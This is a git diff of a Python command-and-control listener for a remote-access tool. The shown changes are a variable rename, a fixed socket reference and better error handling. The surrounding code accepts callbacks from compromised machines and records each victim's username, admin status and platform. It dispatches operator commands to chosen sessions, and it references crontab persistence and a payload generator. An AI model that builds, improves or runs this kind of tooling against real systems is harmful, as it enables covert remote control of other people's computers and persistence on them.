@@ -10,6 +10,7 @@ import shutil
 import platform
 import ipaddress
 import netifaces as ni
+import sys
 
 
 def banner():
@@ -23,7 +24,7 @@ def banner():
 # Handling inbound messages based on the target connection - returning decoded message
 def inbound_message(remote_target):
     print(f'[+] Awaiting response...')
-    response = session_id.recv(1024).decode()
+    response = remote_target.recv(1024).decode()
     return response
 
 
@@ -35,6 +36,7 @@ def outbound_message(remote_target, message):
 # Start a TCP socket listener based on Network Interface/IPv4 and Port provided from user input
 # Handing over the connection received to the message handler in a separate thread for each connection
 def listener_handler():
+
     while True:
         user_input = input(
             "Enter an IPv4 address or a network interface name: ")
@@ -46,6 +48,7 @@ def listener_handler():
         else:
             print(
                 f"\'{user_input}\' is neither a valid IPv4 address nor a valid network interface name.")
+
     global host_port
     host_port = input('[*] Enter Local Port to listen on: ')
     print(f'lport ==> {host_port}')
@@ -59,7 +62,7 @@ def listener_handler():
 # Processing received connections details with 3 additional initial messages: Username, isAdmin, platform type and storing them into Sessions list.
 def message_handler():
     while True:
-        if exit_flag == True:
+        if should_close_socket == True:
             break
         try:
             remote_target, remote_ip = sock.accept()
@@ -80,9 +83,11 @@ def message_handler():
                 [remote_target, remote_ip[0], time_stamp, username, isAdmin, platform])
             print(
                 f'\n[*] Connection received from {remote_ip[0]} \nEnter command#> ', end='')
-        except:
-            print('Something went wrong with message handler...')
-            pass
+        except socket.error as e:
+            if e.errno == 53:
+                print('Connection aborted')
+            else:
+                print('Socket error: ', e)
 
 
 # Get user input minutes (1-59) for crontab persistence
@@ -255,7 +260,7 @@ if __name__ == '__main__':
     banner()
     sessions = []
     listener_counter = 0
-    exit_flag = False
+    should_close_socket = False
     while True:
         try:
             command = input('Enter command#> ')
@@ -279,7 +284,7 @@ if __name__ == '__main__':
                     session_id = (sessions[num - 1])[0]
                     session_handler(session_id)
             if command == 'exit':
-                exit_flag = True
+                should_close_socket = True
                 sock.close()
                 break
 
@@ -291,8 +296,8 @@ if __name__ == '__main__':
                         '[-] You cannot generate a payload without an active listener.')
 
         except KeyboardInterrupt:
-            print('\n [-] Keyboard interrupt issued.')
-            exit_flag = True
+            print('\n[-] Keyboard interrupt issued.')
+            should_close_socket = True
             sock.close()
             break
         except Exception as e:
